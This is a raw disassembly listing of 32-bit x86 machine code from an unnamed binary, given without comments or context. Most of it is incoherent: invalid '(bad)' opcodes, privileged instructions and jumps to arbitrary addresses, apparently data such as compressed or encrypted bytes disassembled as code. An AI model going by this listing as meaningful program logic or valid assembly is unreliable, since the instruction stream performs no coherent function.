  403448:	and    ebp,DWORD PTR [edi]
  40344a:	ret    0x5cff
  40344d:	gs xor bh,ch
  403450:	add    ebx,DWORD PTR [esi-0xa]
  403453:	mov    edi,0xaf532981
  403458:	inc    esp
  403459:	ins    BYTE PTR es:[edi],dx
  40345a:	or     al,0x8d
  40345c:	adc    DWORD PTR [esi-0x3f],eax
  40345f:	jmp    ebx
  403461:	pushf  
  403462:	aam    0x89
  403464:	loope  0x40344b
  403466:	sar    edi,0x59
  403469:	inc    ebp
  40346a:	cmp    ebp,eax
  40346c:	loopne 0x40348d
  40346e:	ret    0xb7ff
  403471:	sub    eax,0xd88475c2
  403476:	mov    bh,ch
  403478:	mov    dl,0xd
  40347a:	ret    0xb450
  40347d:	test   ecx,ebx
  40347f:	jmp    DWORD PTR [ebx-0x678a3c64]
  403485:	pushf  
  403486:	aam    0x25
  403488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403489:	xchg   ebx,eax
  40348a:	outs   dx,BYTE PTR ds:[esi]
  40348b:	retf   0x5497
  40348e:	fnsave [esi]
  403490:	add    eax,0x5d
  403493:	(bad)  [edx]
  403495:	sub    al,0x46
  403497:	retf   0xd005
  40349a:	dec    ecx
  40349b:	xchg   cl,ch
  40349d:	cmp    al,0xe1
  40349f:	dec    edi
  4034a0:	into   
  4034a1:	pop    es
  4034a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034a3:	iret   
  4034a4:	mov    esp,0xc7bc35
	...
  4034b9:	add    BYTE PTR [eax],al
  4034bb:	add    BYTE PTR [esp+esi*8+0x4b],ah
  4034bf:	add    ecx,DWORD PTR [edi+ecx*1+0x357e4b21]
  4034c6:	xchg   esp,eax
  4034c7:	iret   
  4034c8:	and    al,0xc0
  4034ca:	and    eax,0x21898c03
  4034cf:	dec    edi
  4034d0:	jb     0x4034b6
  4034d2:	test   BYTE PTR [edi+0x24],0x2d
  4034d6:	inc    edx
  4034d7:	aam    0x1b
  4034d9:	ss push 0xffffffab
  4034dc:	mov    ah,0x35
  4034de:	push   esp
  4034df:	int3   
  4034e0:	pop    edi
  4034e1:	in     al,0xd9
  4034e3:	mov    bh,0xfd
  4034e5:	xor    eax,0x4081c9de
  4034ea:	leave  
  4034eb:	sub    edx,eax
  4034ed:	xchg   esp,eax
  4034ee:	loope  0x40356c
  4034f0:	push   ecx
  4034f1:	mov    BYTE PTR [esi-0x1efa1bb1],dh
  4034f7:	(bad)  [esi+0x43]
  4034fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034fb:	leave  
  4034fc:	sar    DWORD PTR [edi+0x2caddcad],cl
  403502:	xchg   esi,eax
  403503:	leave  
  403504:	pop    ss
  403505:	push   edx
  403506:	cmp    bh,BYTE PTR [ebx+0x2ee18cce]
  40350c:	pop    es
  40350d:	sub    DWORD PTR [esi],edx
  40350f:	jge    0x40353a
  403511:	mov    WORD PTR [edx+0x8293af3],ds
  403517:	out    dx,eax
  403518:	sbb    ebp,ecx
  40351a:	or     DWORD PTR [ecx-0x73],esp
  40351d:	int    0x88
  40351f:	add    BYTE PTR es:[eax],al
	...
  403532:	add    BYTE PTR [eax],al
  403534:	nop
  403535:	mov    edi,0xcdc4befd
  40353a:	mov    BYTE PTR [esi],dl
  40353c:	mov    al,0xc0
  40353e:	loop   0x4035a9
  403540:	test   DWORD PTR [edi+0x75104c7c],eax
  403546:	add    dh,BYTE PTR [ebp-0x1fc8eb91]
  40354c:	retf   
  40354d:	pop    ecx
  40354e:	sub    DWORD PTR [edi+edx*2+0x67f17d36],0x3c
  403556:	shr    ecx,cl
  403558:	(bad)  
  403559:	adc    eax,esi
  40355b:	jmp    0x8dc8a33d
  403560:	xchg   DWORD PTR ds:0xb53a7d28,esi
  403566:	je     0x403529
  403568:	push   esp
  403569:	xchg   DWORD PTR [edi+eiz*8+0xf],edi
  40356d:	mov    eax,0xc111ee30
  403572:	punpckhwd mm2,QWORD PTR [ebx+0x7c]
  403576:	div    eax
  403578:	push   edx
  403579:	(bad)  
  40357a:	into   
  40357b:	sub    eax,0xc2083588
  403580:	mov    DWORD PTR [ecx],ebp
  403582:	or     dl,dl
  403584:	and    edx,ebp
  403586:	shr    DWORD PTR [ebx+0x625c34e3],0xc3
  40358d:	adc    ah,cl
  40358f:	lds    ebx,FWORD PTR [eax-0x77b3caef]
  403595:	ror    DWORD PTR [eax],cl
  403597:	jmp    0x40359c
	...
  4035ac:	push   ebx
  4035ad:	mov    ds:0xc916d48b,al
  4035b2:	dec    ecx
  4035b3:	jmp    0x41f647
  4035b8:	mov    ds,WORD PTR ss:[ecx+0x890744b]
  4035bf:	jne    0x40356b
  4035c1:	xchg   edi,eax
  4035c2:	enter  0xec5b,0x4e
  4035c6:	add    BYTE PTR [eax],al
  4035c8:	sahf   
  4035c9:	add    edi,ecx
  4035cb:	inc    ebp
  4035cc:	fst    DWORD PTR [edi-0x549afff8]
  4035d2:	dec    ebp
  4035d3:	clc    
  4035d4:	xor    eax,0x3f087d5d
  4035d9:	cwde   
  4035da:	not    DWORD PTR ds:0x497108
  4035e0:	outs   dx,BYTE PTR ds:[esi]
  4035e1:	pop    eax
  4035e2:	jl     0x40363f
  4035e4:	int    0x4e
  4035e6:	rol    DWORD PTR [eax],cl
  4035e8:	xor    eax,0xe88dd8b1
  4035ed:	arpl   WORD PTR [eax+0x6a],bx
  4035f0:	inc    ebp
  4035f1:	push   0xfffffff7
  4035f3:	adc    eax,0x4970b4
  4035f8:	push   ds
  4035f9:	pop    eax
  4035fa:	jl     0x403625
  4035fc:	push   0x72
  4035fe:	in     al,dx
  4035ff:	add    DWORD PTR ds:0x98ff0898,esp
  403605:	pop    edi
  403606:	xchg   DWORD PTR [ebp-0x23],eax
  403609:	pop    ebx
  40360a:	jge    0x403608
  40360c:	jb     0x4035e3
  40360e:	in     al,0x83
	...
  403624:	pusha  
  403625:	sub    al,0xf7
  403627:	jae    0x403615
  403629:	repnz dec esp
  40362b:	lock not DWORD PTR [edi+0x33be0008]
  403632:	into   
  403633:	inc    ebp
  403634:	adc    eax,0xe5000899
  403639:	int    0x8
  40363b:	push   0xffffffb5
  40363d:	int    0x18
  40363f:	lea    ebp,[eax+0x34]
  403642:	pop    eax
  403643:	push   0xffffff8c
  403645:	cmp    eax,0x22b875ce
  40364a:	stc    
  40364b:	test   al,0x57
  40364d:	jl     0x40365b
  40364f:	or     ecx,esp
  403651:	sub    DWORD PTR [ebx+eax*2],ecx
  403654:	movaps xmm7,xmm0
  403657:	add    BYTE PTR [eax],bl
  403659:	xor    eax,0xc58075ce
  40365e:	icebp  
  40365f:	fimul  DWORD PTR [ebp+edi*1+0x74d7c372]
  403666:	retf   0x8c08
  403669:	call   0xf0ac22df
  40366e:	repnz out 0x8b,eax
  403671:	jbe    0x40367f
  403673:	add    ah,cl
  403675:	or     eax,0x825c41d3
  40367a:	iret   
  40367b:	push   eax
  40367c:	dec    ebx
  40367d:	adc    bl,dh
  40367f:	dec    edi
  403680:	xor    al,0x29
  403682:	mov    ds:0xb3e58c00,al
  403687:	ret    0x0
	...
  40369a:	add    BYTE PTR [eax],al
  40369c:	mov    BYTE PTR ds:0xbe388b38,bh
  4036a2:	enter  0xbffc,0xbe
  4036a6:	inc    ecx
  4036a7:	or     BYTE PTR [eax+esi*4+0x64c2af6],cl
  4036ae:	mov    ah,0xc2
  4036b0:	xchg   esp,eax
  4036b1:	cmp    eax,0x3d76db12
  4036b6:	push   ecx
  4036b7:	add    BYTE PTR [esi+0x3d],ah
  4036ba:	push   ecx
  4036bb:	add    bl,dh
  4036bd:	(bad)  
  4036be:	lock (bad) 
  4036c0:	popa   
  4036c1:	and    eax,0x3d760051
  4036c6:	shl    DWORD PTR [esi],cl
  4036c8:	mov    bh,0x3c
  4036ca:	or     ecx,DWORD PTR [ebx]
  4036cc:	int3   
  4036cd:	push   0x94518918
  4036d2:	lods   eax,DWORD PTR ds:[esi]
  4036d3:	(bad)  
  4036d4:	cmp    DWORD PTR [eax],esi
  4036d6:	cdq    
  4036d7:	int    0xab
  4036d9:	xor    bl,BYTE PTR [esi-0x33580c06]
  4036df:	jp     0x4036a5
  4036e1:	mov    ebp,0x338c59e1
  4036e6:	cld    
  4036e7:	(bad)  
  4036e8:	aas    
  4036e9:	xor    esi,esp
  4036eb:	not    DWORD PTR [edx-0x73a61658]
  4036f1:	mov    esi,0x4d96dbe1
  4036f6:	loope  0x4036fb
  4036f8:	xchg   DWORD PTR [esp+edx*8-0x5],edx
  4036fc:	fidivr WORD PTR [ecx+ebx*4]
  4036ff:	(bad)  
	...
  403714:	imul   esi,DWORD PTR [edx],0x1a
  403717:	stos   DWORD PTR es:[edi],eax
  403718:	pop    ss
  403719:	push   esi
  40371a:	stos   BYTE PTR es:[edi],al
  40371b:	mov    esp,0x30e19d4e
  403720:	pop    es
  403721:	inc    ecx
  403722:	retf   
  403723:	(bad)  
  403724:	dec    ebx
  403725:	test   al,0xf9
  403727:	fisttp DWORD PTR [ebx]
  403729:	xor    dl,BYTE PTR [esi]
  40372b:	mov    BYTE PTR [ebp+0x57],0xe5
  40372f:	add    ebx,ecx
  403731:	sbb    eax,0xa0a981f5
  403736:	loope  0x403787
  403738:	mov    dl,BYTE PTR ds:0xa91bfb74
  40373e:	out    0x1a,eax
  403740:	dec    esp
  403741:	pop    esp
  403742:	and    edi,ebx
  403744:	or     edi,DWORD PTR [ecx+eiz*8-0x295f863c]
  40374b:	dec    edi
  40374c:	test   BYTE PTR [edi+eiz*4],bh
  40374f:	test   eax,0xc3ea948c
  403754:	pusha  
  403755:	test   BYTE PTR [eax+0x3c319057],dl
  40375b:	clc    
  40375c:	fisub  DWORD PTR [edi-0x1e481ef8]
  403762:	imul   DWORD PTR [esi+0x72103dd1]
  403768:	and    DWORD PTR [eax-0x5827c6b8],0xffffffe7
  40376f:	xchg   esi,eax
  403770:	leave  
  403771:	(bad)  
  403772:	not    DWORD PTR [esp+eiz*4]
  403775:	loope  0x40376e
  403777:	cld    
	...
  40378c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40378d:	cmp    DWORD PTR [edi+0x5031d18e],edx
  403793:	mov    al,ds:0x14089cce
  403798:	add    eax,0xbcbe5e41
  40379d:	adc    eax,0xa78ff175
  4037a2:	add    DWORD PTR [edx],eax
  4037a4:	dec    eax
  4037a5:	int    0x57
  4037a7:	scas   eax,DWORD PTR es:[edi]
  4037a8:	es push esi
  4037aa:	add    cl,ch
  4037ac:	in     al,0xd7
  4037ae:	add    al,0x6a
  4037b0:	jo     0x403745
  4037b2:	add    ebp,DWORD PTR [ecx]
  4037b4:	mov    esp,0x7529239b
  4037b9:	rcl    DWORD PTR [esi+0x30],1
  4037bc:	dec    esi
  4037bd:	pushf  
  4037be:	or     BYTE PTR [edx+0x73],dh
  4037c1:	mov    al,ds:0x1e379c83
  4037c6:	test   BYTE PTR [edx],0xd5
  4037c9:	mov    edx,0x300fef83
  4037ce:	cmp    BYTE PTR [ebx+0x15],bh
  4037d1:	mov    cl,0xf4
  4037d3:	mov    al,0xc0
  4037d5:	xchg   edi,eax
  4037d6:	mov    ch,bh
  4037d8:	lahf   
  4037d9:	cmp    eax,0xd2cb6925
  4037de:	jp     0x4037cc
  4037e0:	wrmsr  
  4037e2:	dec    esi
  4037e3:	pop    esi
  4037e4:	lock mov al,0xe4
  4037e7:	sub    BYTE PTR [eax],dl
  4037e9:	pop    eax
  4037ea:	add    al,BYTE PTR [eax]
  4037ec:	mov    esi,0xfc773b
	...
  403801:	add    BYTE PTR [eax],al
  403803:	add    BYTE PTR [esi+eax*8+0x5],al
  403807:	sbb    BYTE PTR [ecx],0xcf
  40380a:	jg     0x403814
  40380c:	xor    eax,0xf1806949
  403811:	sub    ah,dl
  403813:	or     esi,ebx
  403815:	push   esp
  403816:	push   ebx
  403817:	pop    edi
  403818:	jnp    0x403807
  40381a:	leave  
  40381b:	or     BYTE PTR [ebp-0x628dc768],dh
  403821:	cwde   
  403822:	xor    DWORD PTR [edi-0x4f],esi
  403825:	mov    BYTE PTR [eax],bh
  403827:	jmp    0x4037e9
  403829:	cwde   
  40382a:	dec    ecx
  40382b:	jb     0x40389c
  40382d:	cwde   
  40382e:	dec    esi
  40382f:	ja     0x4038a4
  403831:	mov    BYTE PTR [ecx+0x4],cl
  403834:	jg     0x403883
  403836:	pop    ds
  403837:	cmp    al,0x44
  403839:	mov    BYTE PTR [edx],0x3c
  40383c:	push   ebx
  40383d:	loope  0x40384d
  40383f:	sub    al,0x54
  403841:	xor    BYTE PTR [ecx],al
  403843:	jmp    0x4038a1
  403845:	(bad)  
  403846:	enter  0xfa5b,0x79
  40384a:	rol    edx,0x2d
  40384d:	xchg   esp,eax
  40384e:	enter  0x31e0,0x2e
  403852:	retf   
  403853:	stos   BYTE PTR es:[edi],al
  403854:	(bad)  
  403855:	ins    BYTE PTR es:[edi],dx
  403856:	mov    eax,esi
  403858:	daa    
  403859:	sub    eax,0x1bb475d2
  40385e:	or     DWORD PTR [eax],eax
  403860:	xor    eax,0xfb5f5394
  403865:	jmp    0x0:0x8c9
	...
  40387c:	and    eax,0x1d505b81
  403881:	int3   
  403882:	pop    ss
  403883:	sub    dh,BYTE PTR [ebp-0x1b8d0f68]
  403889:	push   esi
  40388a:	idiv   DWORD PTR [ebx+0xb3c8c]
  403890:	mov    WORD PTR [esi],ds
  403892:	sahf   
  403893:	dec    ebp
  403894:	dec    ebp
  403895:	cmp    eax,0x45430125
  40389a:	dec    edx
  40389b:	std    
  40389c:	shl    esi,cl
  40389e:	out    dx,al
  40389f:	xlat   BYTE PTR ds:[ebx]
  4038a0:	enter  0xcb2a,0xb9
  4038a4:	ret    
  4038a5:	test   dl,0xff
  4038a8:	mov    esi,0x3906f4df
  4038ad:	adc    eax,0x7e47c387
  4038b2:	iret   
  4038b3:	push   ebp
  4038b4:	pop    ss
  4038b5:	or     cl,BYTE PTR [edi+0x5c8a9cc4]
  4038bb:	pop    eax
  4038bc:	and    al,0x84
  4038be:	out    0x3f,al
  4038c0:	mov    WORD PTR [ebp-0x49b0fec2],fs
  4038c6:	(bad)  
  4038c7:	cmp    eax,0x4be21d
  4038cc:	mov    WORD PTR [ecx+0x1d],ss
  4038cf:	sub    DWORD PTR [ecx-0x73beb85c],0x3d
  4038d6:	aas    
  4038d7:	or     DWORD PTR [edi],ecx
  4038d9:	xor    BYTE PTR [eax+0xb3dcd4b],ch
  4038df:	jne    0x4038e1
	...
  4038f1:	add    BYTE PTR [eax],al
  4038f3:	add    BYTE PTR [ecx+0x555bcc92],dl
  4038f9:	jp     0x4038e2
  4038fb:	fisub  DWORD PTR [ebx+ebx*1]
  4038fe:	aam    0x0
  403900:	mov    WORD PTR [eax+0x13befc51],?
  403906:	add    edx,DWORD PTR [eax+0x23]
  403909:	push   eax
  40390a:	pushf  
  40390b:	dec    ebx
  40390c:	int    0x3d
  40390e:	push   es
  40390f:	rol    BYTE PTR [ebx-0x73ff633f],0x3d
  403916:	ret    0x445
  403919:	xchg   esp,eax
  40391a:	loope  0x40391f
  40391c:	mov    WORD PTR [esp+eiz*2+0x4bc3f448],ss
  403923:	add    al,0x76
  403925:	xchg   esp,eax
  403926:	dec    ebx
  403927:	add    eax,0xc2cda8e3
  40392c:	or     DWORD PTR ds:0x9b8c453a,0x3c3638a1
  403936:	(bad)  
  403937:	fmul   QWORD PTR [esp+edx*4-0x56c9449e]
  40393e:	add    DWORD PTR [edi+0x37e12c31],eax
  403944:	inc    esi
  403945:	das    
  403946:	sbb    al,0xbc
  403948:	mov    ah,0x3f
  40394a:	pushf  
  40394b:	ret    0x1c9b
  40394e:	sub    al,0xb8
  403950:	add    ecx,ebx
  403952:	jns    0x4039a7
  403954:	mov    ebp,DWORD PTR [eax+0xc279]
	...
  40396a:	add    BYTE PTR [eax],al
  40396c:	stc    
  40396d:	sub    bl,bl
  40396f:	add    al,0x7b
  403971:	test   al,0x55
  403973:	ret    0xb99
  403976:	stos   BYTE PTR es:[edi],al
  403977:	inc    esp
  403978:	mov    WORD PTR [ecx+0x19b23721],ds
  40397e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40397f:	mov    bh,0x7
  403981:	test   DWORD PTR [eax+ecx*2+0x5c],esp
  403985:	lds    edx,FWORD PTR [ebx-0x55f05e3e]
  40398b:	inc    esp
  40398c:	mov    WORD PTR [ecx-0x4369c8df],ds
  403992:	ins    BYTE PTR es:[edi],dx
  403993:	push   eax
  403994:	int    0x94
  403996:	push   ds
  403997:	cmp    BYTE PTR [edi*1-0x6b73250b],bl
  40399e:	cli    
  40399f:	ret    
  4039a0:	mov    eax,ds:0x99c2a293
  4039a5:	and    al,0x8
  4039a7:	add    edx,eax
  4039a9:	dec    esp
  4039aa:	or     cl,ch
  4039ac:	into   
  4039ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039ae:	cld    
  4039af:	rcl    DWORD PTR [ecx],1
  4039b1:	inc    eax
  4039b2:	neg    esi
  4039b4:	int    0xa7
  4039b6:	hlt    
  4039b7:	rcl    DWORD PTR [ebx+0x4c],0x8
  4039bb:	jmp    0xb0938bd0
  4039c0:	rol    edi,1
  4039c2:	or     ebp,0xf
  4039c5:	pop    ecx
  4039c6:	enter  0xcdb7,0x2d
  4039ca:	pop    ebx
  4039cb:	sbb    DWORD PTR [eax-0x44],esp
  4039ce:	dec    eax
  4039cf:	rol    BYTE PTR [eax],cl
	...
  4039e1:	add    BYTE PTR [eax],al
  4039e3:	add    BYTE PTR [edi-0x6c],cl
  4039e6:	lock sbb ecx,DWORD PTR [edi-0x549508af]
  4039ed:	enter  0x2843,0x88
  4039f1:	xchg   esp,eax
  4039f2:	jl     0x4039d6
  4039f4:	adc    BYTE PTR [eax+0x51],dh
  4039f7:	xor    cl,BYTE PTR [edi-0x6c]
  4039fa:	or     ch,bh
  4039fc:	mov    eax,ds:0xd1583511
  403a01:	ror    DWORD PTR [eax],cl
  403a03:	jmp    0x1ccbd5cb
  403a08:	sbb    ebx,ecx
  403a0a:	dec    ecx
  403a0b:	jmp    0x24de19f
  403a10:	dec    eax
  403a11:	leave  
  403a12:	shr    DWORD PTR [edx],0x69
  403a15:	dec    edx
  403a16:	not    esp
  403a18:	mov    edx,0x16e949d9
  403a1d:	xlat   BYTE PTR ds:[ebx]
  403a1e:	cld    
  403a1f:	or     esp,DWORD PTR es:[eax-0xa]
  403a23:	es dec ebp
  403a25:	jl     0x403a30
  403a27:	jmp    0x8348f4bb
  403a2c:	xchg   ecx,eax
  403a2d:	cmp    al,0x7b
  403a2f:	xor    DWORD PTR [eax-0x72ff746c],ecx
  403a35:	push   ebx
  403a36:	pop    es
  403a37:	test   BYTE PTR [ebx],dh
  403a39:	xchg   edx,eax
  403a3a:	or     BYTE PTR [eax],al
  403a3c:	ins    BYTE PTR es:[edi],dx
  403a3d:	adc    eax,0x53f2fec0
  403a42:	test   DWORD PTR [ebp-0x8acbf],eax
	...
  403a5c:	mov    ch,0x53
  403a5e:	mov    ebp,0xf753c3c8
  403a63:	call   0x488b05
  403a68:	ficom  WORD PTR [eax+0x7]
  403a6b:	test   BYTE PTR [esi],dl
  403a6d:	xchg   ecx,eax
  403a6e:	or     BYTE PTR [eax],al
  403a70:	dec    ebp
  403a71:	jo     0x403ab8
  403a73:	inc    ecx
  403a74:	mov    ch,0x1d
  403a76:	(bad)  
  403a77:	lock repz push ebx
  403a7a:	not    DWORD PTR [eax+0x1d]
  403a7d:	enter  0xd1,0xb5
  403a81:	lahf   
  403a82:	enter  0x290f,0x58
  403a86:	or     BYTE PTR [eax],al
  403a88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a89:	pop    ebx
  403a8a:	(bad)  
  403a8b:	les    edx,FWORD PTR [ebx]
  403a8d:	push   esp
  403a8e:	test   DWORD PTR [eax],0x8d089875
  403a94:	call   0xf34030ec
  403a99:	(bad)  
  403a9a:	div    DWORD PTR [ebp-0x8aa47]
  403aa0:	ret    0x5182
  403aa3:	dec    ebx
  403aa4:	xor    al,0x98
  403aa6:	adc    DWORD PTR [ebp-0x8aa57],0x5e
  403aad:	pop    eax
  403aae:	pop    es
  403aaf:	test   ch,bl
  403ab1:	xchg   edi,eax
  403ab2:	or     BYTE PTR [eax],al
  403ab4:	ds ret 
  403ab6:	cld    
  403ab7:	push   gs
  403ab9:	add    al,0x8
  403abb:	add    BYTE PTR ds:0xd4bd55,ah
	...
  403ad1:	add    BYTE PTR [eax],al
  403ad3:	add    BYTE PTR [ebx+eax*4+0x3db6ffc8],cl
  403ada:	and    eax,DWORD PTR [eax]
  403adc:	mov    WORD PTR ds:0x831be80d,?
  403ae2:	or     eax,DWORD PTR [eax]
  403ae4:	xchg   edi,eax
  403ae5:	jge    0x403b26
  403ae7:	jns    0x403afe
  403ae9:	icebp  
  403aea:	mov    dl,0x8d
  403aec:	push   ecx
  403aed:	xor    DWORD PTR [eax+ebp*2-0x19],ebx
  403af1:	cmp    al,0x9
  403af3:	add    bl,ch
  403af5:	enter  0xffb4,0x79
  403af9:	lods   al,BYTE PTR ds:[esi]
  403afa:	inc    ebx
  403afb:	inc    ecx
  403afc:	mov    WORD PTR [esi],fs
  403afe:	retf   
  403aff:	je     0x403b35
  403b01:	jmp    0x4b90:0x48cbfc30
  403b08:	dec    ebp
  403b09:	cmp    eax,0x3440c002
  403b0e:	dec    edx
  403b0f:	(bad)  
  403b10:	or     esi,edi
  403b12:	mov    ch,0xff
  403b14:	stos   DWORD PTR es:[edi],eax
  403b15:	cmp    eax,0xc88c000b
  403b1a:	add    eax,0x50b7129a
  403b20:	and    al,0xea
  403b22:	or     cl,BYTE PTR [edi]
  403b24:	mov    WORD PTR ds:0x3d8cd893,ss
  403b2a:	add    al,al
  403b2c:	add    DWORD PTR [ecx],ebp
  403b2e:	mov    bh,BYTE PTR [ebp-0x4834b4]
  403b34:	mov    WORD PTR [ecx+0x7],cs
  403b37:	inc    DWORD PTR [eax]
	...
  403b49:	add    BYTE PTR [eax],al
  403b4b:	add    BYTE PTR [ecx],bl
  403b4d:	jge    0x403b05
  403b4f:	call   FWORD PTR [ebx-0x5e]
  403b52:	add    ebx,edx
  403b54:	(bad)  
  403b55:	cld    
  403b56:	or     ch,bl
  403b58:	jg     0x403b30
  403b5a:	adc    bh,bh
  403b5c:	mov    ecx,0x62f0a479
  403b61:	xchg   esp,eax
  403b62:	loope  0x403b67
  403b64:	xor    esp,DWORD PTR [ecx+0x4234ac29]
  403b6a:	loope  0x403b6f
  403b6c:	aaa    
  403b6d:	pushf  
  403b6e:	push   es
  403b6f:	cmp    DWORD PTR [esp+edi*1],edx
  403b72:	das    
  403b73:	(bad)  
  403b74:	mov    WORD PTR [esp+eiz*2-0x1d62777],ss
  403b7b:	mov    esi,0xcc3c2b5c
  403b80:	cli    
  403b81:	sub    ch,dh
  403b83:	stos   DWORD PTR es:[edi],eax
  403b84:	bound  eax,QWORD PTR [ebx-0x1f]
  403b87:	add    esi,ebp
  403b89:	nop
  403b8a:	fidivr WORD PTR [esi-0x3463d51d]
  403b90:	fisubr DWORD PTR [edx]
  403b92:	into   
  403b93:	stos   DWORD PTR es:[edi],eax
  403b94:	adc    BYTE PTR [edx-0x1f],al
  403b97:	add    edx,DWORD PTR [edi]
  403b99:	push   edi
  403b9a:	sbb    cl,ch
  403b9c:	iret   
  403b9d:	shr    BYTE PTR [edx-0x51],0xf
  403ba1:	push   eax
  403ba2:	popf   
  403ba3:	push   ebx
  403ba4:	pop    edi
  403ba5:	lds    esi,FWORD PTR [ebx]
  403ba7:	push   edi
  403ba8:	inc    edx
  403ba9:	pop    ds
  403baa:	and    al,0x10
  403bac:	adc    DWORD PTR [ecx+eiz*2],ebx
  403baf:	add    eax,DWORD PTR [eax]
	...
  403bc1:	add    BYTE PTR [eax],al
  403bc3:	add    BYTE PTR [esp+edx*4-0x6c36e884],cl
  403bca:	loope  0x403bcf
  403bcc:	mov    WORD PTR ds:0x54548a99,ds
  403bd2:	mov    DWORD PTR ds:0x8a5dd005,eax
  403bd8:	icebp  
  403bd9:	pushf  
  403bda:	loop   0x403b98
  403bdc:	push   edx
  403bdd:	xchg   edx,eax
  403bde:	popa   
  403bdf:	sub    BYTE PTR [edi+0x6a],0xa
  403be3:	mov    ebx,0x32092e0f
  403be8:	adc    BYTE PTR [ebp-0x6b3384b6],0x8
  403bef:	jmp    0xeb0bb983
  403bf4:	imul   DWORD PTR [ecx]
  403bf6:	dec    ebp
  403bf7:	adc    eax,0x6c30c200
  403bfc:	fs and al,0xcf
  403bff:	out    dx,eax
  403c00:	mov    BYTE PTR [ebp+0x4d],dh
  403c03:	xchg   BYTE PTR [edx-0x2d],dl
  403c06:	or     al,0x70
  403c08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c09:	push   edi
  403c0a:	out    0x26,eax
  403c0c:	push   ecx
  403c0d:	pushf  
  403c0e:	not    BYTE PTR ds:0xa7cf0c85
  403c14:	mov    esp,DWORD PTR [edx+0x29981b5c]
  403c1a:	jge    0x403be9
  403c1c:	sub    DWORD PTR [eax+0x244b6400],esp
  403c22:	pop    eax
  403c23:	rol    DWORD PTR [ebx+0xe90894],0x0
	...
  403c3a:	add    BYTE PTR [eax],al
  403c3c:	adc    ebp,esp
  403c3e:	or     ebp,ecx
  403c40:	(bad)  
  403c41:	xchg   esp,eax
  403c42:	xor    DWORD PTR [eax+ebx*4],0x25
  403c46:	lods   eax,DWORD PTR ds:[esi]
  403c47:	mulps  xmm1,xmm6
  403c4a:	push   ecx
  403c4b:	inc    edx
  403c4c:	push   eax
  403c4d:	pop    ebx
  403c4e:	retf   0x8fed
  403c51:	mov    edi,0x510d8583
  403c56:	hlt    
  403c57:	aaa    
  403c58:	inc    ecx
  403c59:	les    ebx,FWORD PTR [ebx+0x18]
  403c5c:	ds sbb eax,0xa714ed7d
  403c62:	add    BYTE PTR [edx-0x35],ah
  403c65:	test   BYTE PTR [ecx+0xf1d4c24],al
  403c6b:	jb     0x403c3e
  403c6d:	nop
  403c6e:	sub    DWORD PTR [esi-0x1aa0e269],0x14
  403c75:	sub    edi,DWORD PTR [ebx]
  403c77:	push   ebx
  403c78:	ins    DWORD PTR es:[edi],dx
  403c79:	cmp    eax,DWORD PTR cs:[eax]
  403c7c:	iret   
  403c7d:	sbb    DWORD PTR [edi+eax*1-0x289d4eb3],ecx
  403c84:	(bad)
  403c89:	xchg   esp,eax
  403c8a:	retf   
  403c8b:	mov    ebp,DWORD PTR [esi+0x23]
  403c8e:	lock and ebp,DWORD PTR [ebp+0x23]
  403c92:	lock lea esp,[ecx+0x72b75e7f]
  403c99:	clc    
  403c9a:	or     dl,BYTE PTR [esi+0x21]
  403c9d:	push   esi
  403c9e:	retf   0xc
	...
  403cb1:	add    BYTE PTR [eax],al
  403cb3:	add    dh,dh
  403cb5:	inc    esp
  403cb6:	cmp    eax,0x46
  403cb9:	in     al,dx
  403cba:	sub    bh,dl
  403cbc:	ss in  al,dx
  403cbe:	test   BYTE PTR [edx+edi*8-0x6edf87b5],cl
  403cc5:	xchg   ebx,eax
  403cc6:	inc    esi
  403cc7:	or     BYTE PTR [esi+edx*2],dh
  403cca:	sbb    DWORD PTR [ebx],eax
  403ccc:	das    
  403ccd:	sbb    al,0xf2
  403ccf:	xor    ecx,ebp
  403cd1:	xor    esi,eax
  403cd3:	xor    ecx,ebp
  403cd5:	sbb    DWORD PTR [edi+ebx*1-0x3e4aa935],edx
  403cdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cdd:	mov    BYTE PTR [ecx+eax*8],0xe6
  403ce1:	jle    0x403cee
  403ce3:	fstp   DWORD PTR [esi]
  403ce5:	out    dx,al
  403ce6:	cmp    bh,dl
  403ce8:	(bad)  
  403ce9:	jmp    0x403d25
  403ceb:	cli    
  403cec:	cmp    BYTE PTR [ecx],dl
  403cee:	imul   ebx,DWORD PTR [edx-0x4cfc0298]
  403cf5:	or     cl,0xc0
  403cf8:	jb     0x403c8f
  403cfa:	retf   
  403cfb:	mov    edi,esi
  403cfd:	and    al,0xf0
  403cff:	and    ebp,ebp
  403d01:	and    al,0xf0
  403d03:	(bad)  
  403d04:	loope  0x403c86
  403d06:	and    al,dh
  403d08:	mov    WORD PTR [esi+0x21c2034c],?
  403d0e:	retf   0x80c2
  403d11:	cmp    bl,bl
  403d13:	mov    eax,DWORD PTR [ebx+ebp*1-0x50]
  403d17:	and    eax,DWORD PTR [eax]
	...
  403d29:	add    BYTE PTR [eax],al
  403d2b:	add    BYTE PTR [esi+0x2b],al
  403d2e:	mov    al,0x8d
  403d30:	or     BYTE PTR [edi+0x18],al
  403d33:	inc    esi
  403d34:	jl     0x403cfb
  403d36:	or     BYTE PTR [esi-0x7c],cl
  403d39:	jl     0x403d05
  403d3b:	adc    DWORD PTR [edi+0x5ffa8073],ecx
  403d41:	test   eax,ebp
  403d43:	clc    
  403d44:	pop    edi
  403d45:	xchg   ebp,eax
  403d46:	xchg   BYTE PTR [ebx+ebp*4+0x1469e3c],bl
  403d4d:	cmp    edx,DWORD PTR [ebp+0x1c]
  403d50:	int    0x7a
  403d52:	sbb    eax,0xb5a2d503
  403d57:	xor    esp,esi
  403d59:	call   0x788:0xb0e633b7
  403d60:	mov    ah,0xa5
  403d62:	mov    WORD PTR [ecx-0x71],gs
  403d65:	ja     0x403d53
  403d67:	ror    ah,0x2e
  403d6a:	push   cs
  403d6b:	ret    
  403d6c:	pop    ss
  403d6d:	jecxz  0x403d6d
  403d6f:	clc    
  403d70:	outs   dx,DWORD PTR ds:[esi]
  403d71:	in     eax,0xfe
  403d73:	clc    
